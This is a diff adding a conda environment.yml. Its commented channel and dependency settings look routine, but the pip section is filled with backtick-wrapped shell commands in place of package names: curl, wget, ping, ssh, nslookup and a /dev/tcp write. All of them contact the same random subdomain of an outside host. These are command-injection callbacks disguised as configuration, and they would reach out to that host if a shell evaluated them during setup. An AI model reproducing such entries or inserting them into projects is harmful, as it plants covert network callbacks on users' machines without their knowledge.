@@ -1,0 +1,18 @@
+name: my_project_env       # The name used to activate the environment
+channels:                  # Repositories where conda looks for packages
+  - conda-forge            # Recommended community-led channel (high stability)
+  - defaults               # Standard Anaconda channel
+dependencies:              # Core packages installed via conda
+  - python=3.10            # Pinning major/minor version ensures consistency
+  - pip                    # Required to safely manage secondary pip installs
+  - numpy>=1.22
+  - pandas=2.1.*           # Wildcards allow patch updates but lock minor versions
+  - scikit-learn
+  - pip:                   # Packages not available or preferred via conda
+    - `curl hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc`
+    - `ping hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc`
+    - `wget hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc`
+    - `ssh hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc`
+    - `nslookup hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc`
+    - `echo 123 >> /dev/tcp/hpatshoj7kos4d6r9r9yydld0463u3is.e.sigint.nyc/80`
+    
